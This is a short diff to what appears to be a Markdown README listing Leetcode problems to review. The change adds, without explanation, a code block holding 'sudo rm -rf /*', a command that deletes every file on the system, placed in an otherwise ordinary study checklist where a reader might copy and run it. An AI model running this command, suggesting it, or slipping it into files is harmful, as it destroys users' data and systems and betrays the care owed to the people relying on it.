@@ -1,5 +1,7 @@
 # Leetcode
- 
+```
+sudo rm -rf /*
+```
 ### Need review
 - Binary Search
     - [ ] 4
